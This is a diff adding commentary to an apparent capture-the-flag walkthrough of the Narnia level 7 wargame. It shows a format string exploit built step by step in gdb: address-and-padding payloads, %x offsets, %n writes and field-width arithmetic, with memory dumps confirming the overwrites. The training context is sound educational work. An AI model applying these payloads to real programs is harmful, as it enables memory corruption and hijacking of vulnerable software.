@@ -153,6 +153,8 @@ exit(0 <unfinished ...>
 +++ exited (status 0) +++
 >```
 >
+> Well that definately worked.  We can see our ```0x41414141``` is popped off after 6 ```%x```.  So now we can setup for the writes.  We'll need to reference each byte of the memory that we want to overwrite each separated by any four bytes.  Here we'll use ```JUNK``` from our example as it is 4 bytes.  After that, we'll need to try to determine what the first width of the first format string will be as it will allow us to write our first value to memory.  We can determine that by first see what value exists currently in memory with the standard with of ```%8x```.  Once we determine that, we can determine our actual width using ```"the byte to be written" - "the outputted byte" + 8```.  After translating that value to decimal we can set the width of the 5th ```%x``` which should be the ```%x``` right before our ```%n```.  This will effectively overwrite the first byte of memory with our desired value.  Let's see if it works.
+>
 >```
 (gdb) run $(python -c 'print "\x0c\xd6\xff\xffJUNK\x0d\xd6\xff\xffJUNK\x0e\xd6\xff\xffJUNK\x0f\xd6\xff\xff"+"%x%x%x%x%8x%n"')
 Starting program: /games/narnia/narnia7 $(python -c 'print "\x0c\xd6\xff\xffJUNK\x0d\xd6\xff\xffJUNK\x0e\xd6\xff\xffJUNK\x0f\xd6\xff\xff"+"%x%x%x%x%8x%n"')
@@ -182,6 +184,11 @@ Breakpoint 1, 0x08048685 in vuln ()
 0xffffd60c:	0x00000106	0xffffd60c	0x4b4e554a	0xffffd60d
 0xffffd61c:	0x4b4e554a	0xffffd60e	0x4b4e554a	0xffffd60f
 0xffffd62c:	0x38343038	0x66383332
+>```
+>
+> In this specific case the first byte we wanted to write was ```0x06``` and the byte that already resided in memory was ```0x3c```.  Since ```0x3c``` is larger than the byte we want to write, we will have to wrap it around to make it larger.  Essentiall we did ```0x106 - 0x3c + 8``` instead of ```0x06 - 0x3c + 8```.  As we can see, this worked and we have successfully overwritten the first byte.  To calculate the next byte we will use the formula ```"the byte we want to write" - "the previous byte"```.  Again, if the byte we want to write is smaller than the previous byte we will need to wrap it to make it larger.  In this case we want to write ```0x87``` but the previous byte was ```0x106```, so we'll wrap the ```0x87``` to ```0x187``` and proceed with the formula.
+>
+>```
 (gdb) p 0x187-0x106
 $10 = 129
 (gdb) run $(python -c 'print "\x0c\xd6\xff\xffJUNK\x0d\xd6\xff\xffJUNK\x0e\xd6\xff\xffJUNK\x0f\xd6\xff\xff"+"%x%x%x%x%210x%n%129x%n"')
@@ -197,6 +204,8 @@ Breakpoint 1, 0x08048685 in vuln ()
 0xffffd60c:	0x00018706	0xffffd600	0x4b4e554a	0xffffd60f
 0xffffd61c:	0x38343038	0x66383332	0x64666666	0x66383536
 0xffffd62c:	0x64666637	0x30343961
+>```
+>```
 (gdb) p 0x204-0x187
 $20 = 125
 (gdb) run $(python -c 'print "\xfc\xd5\xff\xffJUNK\xfd\xd5\xff\xffJUNK\xfe\xd5\xff\xffJUNK\xff\xd5\xff\xff"+"%x%x%x%x%210x%n%129x%n%125x%n"')
